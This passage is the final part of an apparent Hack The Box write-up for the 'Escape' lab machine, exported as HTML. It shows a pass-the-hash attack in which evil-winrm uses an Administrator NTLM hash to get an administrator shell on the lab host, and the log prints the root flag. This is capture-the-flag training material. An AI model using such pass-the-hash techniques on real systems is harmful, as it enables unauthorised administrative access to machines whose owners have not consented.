+</code></pre><h3 id="1a3d1b9f-8847-8004-936e-d62e8c021ee1" class="">Got it! NTLM Hash, now Pass The Hash</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8050-a15f-ec196de5d337" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ evil-winrm -H A52F78E4C751E5F5E17E1E9F3E58F4EE -u &#x27;Administrator&#x27; -i 10.10.11.202 
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt
+f7fd3107dea3abfa831b58107afddb78
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
